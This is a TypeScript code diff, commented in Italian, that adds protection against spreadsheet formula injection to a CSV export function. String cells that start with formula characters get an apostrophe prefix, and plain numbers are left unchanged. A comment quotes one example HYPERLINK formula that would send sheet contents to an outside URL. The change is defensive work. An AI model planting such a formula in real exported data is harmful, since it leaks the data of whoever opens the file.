@@ -7,6 +7,26 @@ export type CsvColumn<TRow> = {
 // a-capo, e le virgolette al suo interno si raddoppiano. Tutto il resto esce così com'è.
 const escapeCsvField = (raw: string): string => (/[",\r\n]/.test(raw) ? `"${raw.replace(/"/g, '""')}"` : raw);
 
+/**
+ * Excel e LibreOffice trattano come formula ogni cella che comincia con `=`, `+`, `-` o `@`
+ * (e con tab o a-capo, che alcune versioni scartano prima di guardare il primo carattere), e
+ * le virgolette RFC 4180 non lo impediscono: vengono tolte prima della valutazione. I testi
+ * esportati li scrive chiunque abbia un account (note, nomi, descrizioni), mentre il file lo
+ * apre di solito l'amministratore: una nota come `=HYPERLINK("https://…?d="&B2;"apri")`
+ * spediva altrove il contenuto del foglio. Anche senza cattive intenzioni un telefono scritto
+ * `+39 333 …` diventava una formula sbagliata al posto del numero.
+ *
+ * L'apostrofo davanti è la difesa raccomandata da OWASP: il foglio mostra il testo così
+ * com'è, apostrofo compreso. Un numero scritto come testo (i prezzi `numeric` arrivano da
+ * Postgres come stringhe, anche negativi) non è una formula e resta intatto, altrimenti
+ * `-5.00` non sarebbe più sommabile.
+ */
+const formulaTriggerPattern = /^[=+\-@\t\r]/;
+const plainNumberPattern = /^[+-]?\d+(?:\.\d+)?$/;
+
+const neutralizeFormula = (text: string): string =>
+    formulaTriggerPattern.test(text) && !plainNumberPattern.test(text) ? `'${text}` : text;
+
 const toCsvText = (value: string | number | boolean | Date | null | undefined): string => {
     if (value == null) {
         return "";
@@ -18,6 +38,10 @@ const toCsvText = (value: string | number | boolean | Date | null | undefined): 
 
     if (typeof value === "boolean") {
         return value ? "Sì" : "No";
+    }
+
+    if (typeof value === "string") {
+        return neutralizeFormula(value);
     }
 
     return String(value);
